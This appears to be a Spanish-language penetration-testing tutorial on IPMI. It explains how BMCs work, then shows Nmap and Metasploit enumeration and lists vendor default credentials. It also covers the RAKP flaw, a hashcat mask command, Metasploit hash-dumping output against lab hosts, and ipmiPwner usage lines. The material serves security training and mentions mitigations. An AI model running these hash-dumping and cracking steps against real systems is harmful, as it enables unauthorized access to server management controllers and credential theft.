
# IPMI

## <mark style="color:purple;">Cómo funciona</mark>

[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) ( `IPMI`) es un conjunto de especificaciones estandarizadas para sistemas de gestión de host basados ​​en hardware que se utilizan para la gestión y supervisión del sistema. Actúa como un subsistema autónomo y funciona independientemente del BIOS, la CPU, el firmware y el sistema operativo subyacente del host. IPMI brinda a los administradores de sistemas la capacidad de administrar y monitorear sistemas incluso si están apagados o en un estado que no responde. Funciona mediante una conexión de red directa al hardware del sistema y no requiere acceso al sistema operativo a través de un shell de inicio de sesión. IPMI también se puede utilizar para actualizaciones remotas de sistemas sin necesidad de acceso físico al host de destino. IPMI se utiliza normalmente de tres maneras:

* Antes de que el sistema operativo haya arrancado para modificar la configuración del BIOS
* Cuando el host está completamente apagado
* Acceso a un host después de una falla del sistema

Cuando no se utiliza para estas tareas, IPMI puede monitorear una variedad de cosas diferentes, como la temperatura del sistema, el voltaje, el estado del ventilador y las fuentes de alimentación. También se puede utilizar para consultar información de inventario, revisar registros de hardware y alertar mediante SNMP. El sistema host se puede apagar, pero el módulo IPMI requiere una fuente de alimentación y una conexión LAN para funcionar correctamente.

El protocolo IPMI fue publicado por primera vez por Intel en 1998 y ahora cuenta con el respaldo de más de 200 proveedores de sistemas, incluidos Cisco, Dell, HP, Supermicro, Intel y más. Los sistemas que utilizan IPMI versión 2.0 se pueden administrar vía serie a través de LAN, lo que brinda a los administradores de sistemas la capacidad de ver la salida de la consola serie en banda. Para funcionar, IPMI requiere los siguientes componentes:

* Controlador de gestión de placa base (BMC): un microcontrolador y componente esencial de una IPMI
* Bus de gestión de chasis inteligente (ICMB): una interfaz que permite la comunicación de un chasis a otro.
* Bus de gestión de plataforma inteligente (IPMB): amplía el BMC
* Memoria IPMI: almacena cosas como el registro de eventos del sistema, datos del almacén del repositorio y más
* Interfaces de comunicaciones: interfaces de sistema local, interfaces seriales y LAN, bus de administración ICMB y PCI

***

## <mark style="color:purple;">Enumeración del servicio</mark>

IPMI se comunica a través del puerto 623 UDP. Los sistemas que utilizan el protocolo IPMI se denominan controladores de gestión de placa base (BMC). Los BMC generalmente se implementan como sistemas ARM integrados que ejecutan Linux y se conectan directamente a la placa base del host. Los BMC están integrados en muchas placas base, pero también se pueden agregar a un sistema como una tarjeta PCI.&#x20;

La mayoría de los servidores vienen con un BMC o admiten la adición de un BMC. Los BMC más comunes que vemos durante las pruebas de penetración interna son HP iLO, Dell DRAC y Supermicro IPMI. Si podemos acceder a un BMC durante una evaluación, obtendremos acceso completo a la placa base del host y podremos monitorear, reiniciar, apagar o incluso reinstalar el sistema operativo del host.&#x20;

Obtener acceso a un BMC es casi equivalente al acceso físico a un sistema. Muchos BMC (incluidos HP iLO, Dell DRAC y Supermicro IPMI) exponen una consola de administración basada en web, algún tipo de protocolo de acceso remoto por línea de comandos, como Telnet o SSH, y el puerto 623 UDP, que, nuevamente, es para el Protocolo de red IPMI. A continuación se muestra un escaneo de Nmap de muestra utilizando el script NSE [de la versión ipmi de](https://nmap.org/nsedoc/scripts/ipmi-version.html) Nmap para rastrear el servicio.

### **Nmap**

```bash
afsh4ck$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aquí, podemos ver que el protocolo IPMI efectivamente está escuchando en el puerto 623, y Nmap ha tomado las huellas digitales de la versión 2.0 del protocolo. También podemos utilizar el módulo de escáner Metasploit [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi\_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/) .

### **Metasploit - Escaneo de versión con**&#x20;

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Durante las pruebas de penetración internas, a menudo nos encontramos con BMC en los que los administradores no han cambiado la contraseña predeterminada. Algunas contraseñas predeterminadas únicas para mantener en nuestras hojas de referencia incluyen:

<table data-header-hidden><thead><tr><th width="177"></th><th></th><th></th></tr></thead><tbody><tr><td>Producto</td><td>Nombre de usuario</td><td>Contraseña</td></tr><tr><td>iDRAC de Dell</td><td>root</td><td>calvin</td></tr><tr><td>HP iLO</td><td>Administrator</td><td>cadena aleatoria de 8 caracteres que consta de números y letras mayúsculas</td></tr><tr><td>IPMI supermicro</td><td>ADMIN</td><td>ADMIN</td></tr></tbody></table>

También es esencial probar contraseñas predeterminadas conocidas para CUALQUIER servicio que descubramos, ya que a menudo no se modifican y pueden generar ganancias rápidas. Cuando se trata de BMC, estas contraseñas predeterminadas pueden darnos acceso a la consola web o incluso acceso a la línea de comandos a través de SSH o Telnet.

***

## <mark style="color:purple;">Configuraciones peligrosas</mark>

Si las credenciales predeterminadas no funcionan para acceder a un BMC, podemos recurrir a una [falla](http://fish2.com/ipmi/remote-pw-cracking.html) en el protocolo RAKP en IPMI 2.0. Durante el proceso de autenticación, el servidor envía un hash SHA1 o MD5 salado de la contraseña del usuario al cliente antes de que se realice la autenticación. Esto se puede aprovechar para obtener el hash de contraseña para CUALQUIER cuenta de usuario válida en el BMC.&#x20;

Estos hash de contraseña se pueden descifrar sin conexión mediante un ataque de diccionario usando `Hashcat` y el modo `7300`. En el caso de que un HP iLO utilice una contraseña predeterminada de fábrica, podemos usar este comando de ataque de máscara Hashcat `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` que prueba todas las combinaciones de letras mayúsculas y números para una contraseña de ocho caracteres.

No existe una "solución" directa para este problema porque la falla es un componente crítico de la especificación IPMI. Los clientes pueden optar por contraseñas muy largas y difíciles de descifrar o implementar reglas de segmentación de red para restringir el acceso directo a los BMC. Es importante no pasar por alto IPMI durante las pruebas de penetración internas (lo vemos durante la mayoría de las evaluaciones) porque no solo a menudo podemos obtener acceso a la consola web de BMC, lo cual es un hallazgo de alto riesgo, sino que también hemos visto entornos en los que un único ( pero descifrable) se establece una contraseña que luego se reutiliza en otros sistemas.&#x20;

En una de esas pruebas de penetración, obtuvimos un hash IPMI, lo desciframos sin conexión usando Hashcat y pudimos ingresar mediante SSH a muchos servidores críticos en el entorno como usuario raíz y obtener acceso a consolas de administración web para varias herramientas de monitoreo de red.

Para recuperar hashes de IPMI, podemos utilizar el módulo [de recuperación de hash de contraseña SHA1 remota RAKP de Metasploit IPMI 2.0](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) .

### **Metasploit - Hashdump**

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Aquí podemos ver que hemos obtenido con éxito el hash de la contraseña del usuario `ADMIN`y la herramienta pudo descifrarlo rápidamente para revelar lo que parece ser una contraseña predeterminada `ADMIN`. Desde aquí, podríamos intentar iniciar sesión en BMC o, si la contraseña fuera algo más exclusiva, verificar la reutilización de la contraseña en otros sistemas.

## <mark style="color:purple;">IPMI Pwner</mark>

Es un script automático que indicandole la IP y el diccionario que queremos utilizar hace un hashdump y crackea automáticamente los hashes que se encuentre.

{% embed url="<https://github.com/c0rnf13ld/ipmiPwner>" %}

### Ejemplos de uso

```bash
python3 ipmipwner.py --host 192.168.1.12 -c john -oH hash -pW /usr/share/wordlists/rockyou.txt
python3 ipmipwner.py --host 192.168.1.12 -oH hash
python3 ipmipwner.py --host 192.168.1.12 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -oH hash
python3 ipmipwner.py --host 192.168.1.12 -u root -c john -pW /usr/share/wordlists/rockyou.txt -oH hash
python3 ipmipwner.py --host 192.168.1.12 -p 624 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -c python -pW /usr/share/wordlists/rockyou.txt -oH hash -oC crackedHash
```

<figure><img src="/files/DxggEc4jC6NS8uf8iFaR" alt=""><figcaption></figcaption></figure>

IPMI es muy común en entornos de red, ya que los administradores de sistemas deben poder acceder a los servidores de forma remota en caso de una interrupción o realizar ciertas tareas de mantenimiento para las que tradicionalmente habrían tenido que estar físicamente frente al servidor. Esta facilidad de administración conlleva el riesgo de exponer los hashes de contraseñas a cualquier persona en la red y puede provocar acceso no autorizado, interrupción del sistema e incluso ejecución remota de código. La verificación de IPMI debería ser parte de nuestro manual de pruebas de penetración interna para cualquier entorno que estemos evaluando.
